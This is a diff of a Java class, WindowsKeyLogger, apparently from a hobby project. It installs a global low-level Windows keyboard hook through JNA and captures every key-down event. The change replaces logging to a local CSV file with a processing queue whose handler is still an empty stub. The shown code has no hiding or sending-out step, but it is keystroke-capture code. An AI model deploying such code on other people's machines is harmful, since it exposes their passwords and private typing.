@@ -1,12 +1,12 @@
 package co.uk.baconi.keylogger.framework.impl;
 
-import static co.uk.baconi.keylogger.framework.constants.Strings.COMMA;
-import static co.uk.baconi.utils.StringUtil.concat;
+import java.util.concurrent.BlockingQueue;
+
+import org.apache.log4j.Logger;
+
 import co.uk.baconi.keylogger.framework.constants.Numbers;
-import co.uk.baconi.keylogger.framework.interfaces.KeyConverter;
+import co.uk.baconi.keylogger.framework.impl.WindowsKeyLogger.WindowsKeyResult;
 import co.uk.baconi.keylogger.framework.interfaces.KeyLogger;
-import co.uk.baconi.utils.LoggerUtil;
-import co.uk.baconi.utils.TimeUtil;
 
 import com.sun.jna.Platform;
 import com.sun.jna.platform.win32.Kernel32;
@@ -20,9 +20,11 @@ import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
 import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
 import com.sun.jna.platform.win32.WinUser.MSG;
 
-public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
+public final class WindowsKeyLogger extends AbstractImpl<WindowsKeyResult> implements KeyLogger {
     private static final String LOG_ERROR_MSG = "This key logger implementation should only be used on a Windows OS.";
     private static final String EXCEPTION_ERROR_MSG = "This key logger implementation only supports Windows.";
+
+    private static final Logger LOG = Logger.getLogger(WindowsKeyLogger.class);
 
     private static volatile boolean quit;
     private final HHOOK hhk;
@@ -31,23 +33,24 @@ public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
         super();
 
         if (!Platform.isWindows()) {
-            log.error(LOG_ERROR_MSG);
+            LOG.error(LOG_ERROR_MSG);
             throw new RuntimeException(EXCEPTION_ERROR_MSG);
         }
         final HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
-        final WindowsKeyboardHook keyboardHook = new WindowsKeyboardHook(this);
+        final LowLevelKeyoardProcImpl keyboardHook = new LowLevelKeyoardProcImpl(this);
         hhk = User32.INSTANCE.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, Numbers.ZERO);
     }
 
     @Override
-    public void startLogging(final KeyConverter keyConverter) {
+    public void startLogging() {
         new Thread() {
             @Override
             public void run() {
                 while (!quit) {
                     try {
                         Thread.sleep(Numbers.TEN);
-                    } catch (final Exception e) {
+                    } catch (final Throwable t) {
+                        LOG.error(t.getClass().getName(), t);
                     }
                 }
                 User32.INSTANCE.UnhookWindowsHookEx(hhk);
@@ -70,6 +73,11 @@ public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
         User32.INSTANCE.UnhookWindowsHookEx(hhk);
     }
 
+    @Override
+    protected void processResults(final BlockingQueue<WindowsKeyResult> processQueue) {
+        // TODO Auto-generated method stub
+    }
+
     private HHOOK getHHOOK() {
         return hhk;
     }
@@ -78,17 +86,12 @@ public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
         quit = true;
     }
 
-    private static final class WindowsKeyboardHook implements LowLevelKeyboardProc {
-        private static final int Q_KEY_VKCODE = 81;
-
-        private static final String[] LOG_HEADINGS = { "wParam", "vkCode", "flags", "scanCode", "dwExtraInfo", "time",
-                "Year-Month-Day", "Hour:Minute:Second:Millisecond" };
-
-        private static final LoggerUtil LOGGER = LoggerUtil.getLogger("KeyHookLog.csv", false, true, LOG_HEADINGS);
+    private static final class LowLevelKeyoardProcImpl implements LowLevelKeyboardProc {
+        private static final int QUITE_KEY_CODE = 81;
 
         private final WindowsKeyLogger parent;
 
-        public WindowsKeyboardHook(final WindowsKeyLogger parent) {
+        public LowLevelKeyoardProcImpl(final WindowsKeyLogger parent) {
             this.parent = parent;
         }
 
@@ -96,11 +99,13 @@ public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
         public LRESULT callback(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
             if (nCode >= 0) {
                 if (wParam.intValue() == WinUser.WM_KEYDOWN) {
-                    LOGGER.log(concat(nCode, COMMA, wParam, COMMA, info.vkCode, COMMA, info.flags, COMMA,
-                            info.scanCode, COMMA, info.dwExtraInfo, COMMA, info.time, COMMA,
-                            TimeUtil.getCurrentDateTime()));
+                    try {
+                        parent.addToProcessQueue(new WindowsKeyResult(nCode, wParam, info));
+                    } catch (final InterruptedException e) {
+                        LOG.error(e.getClass().getName(), e);
+                    }
 
-                    if (info.vkCode == Q_KEY_VKCODE) {
+                    if (info.vkCode == QUITE_KEY_CODE) {
                         parent.quit();
                     }
                 }
@@ -109,4 +114,51 @@ public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
         }
     }
 
+    protected static final class WindowsKeyResult {
+        private final int nCode;
+        private final int wParam;
+        private final int vkCode;
+        private final int scanCode;
+        private final int flags;
+        private final int time;
+        private final long dwExtraInfo;
+
+        private WindowsKeyResult(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
+            this.nCode = nCode;
+            this.wParam = wParam.intValue();
+            dwExtraInfo = info.dwExtraInfo.longValue();
+            flags = info.flags;
+            scanCode = info.scanCode;
+            time = info.time;
+            vkCode = info.vkCode;
+        }
+
+        public int getnCode() {
+            return nCode;
+        }
+
+        public int getwParam() {
+            return wParam;
+        }
+
+        public int getVkCode() {
+            return vkCode;
+        }
+
+        public int getScanCode() {
+            return scanCode;
+        }
+
+        public int getFlags() {
+            return flags;
+        }
+
+        public int getTime() {
+            return time;
+        }
+
+        public long getDwExtraInfo() {
+            return dwExtraInfo;
+        }
+    }
 }
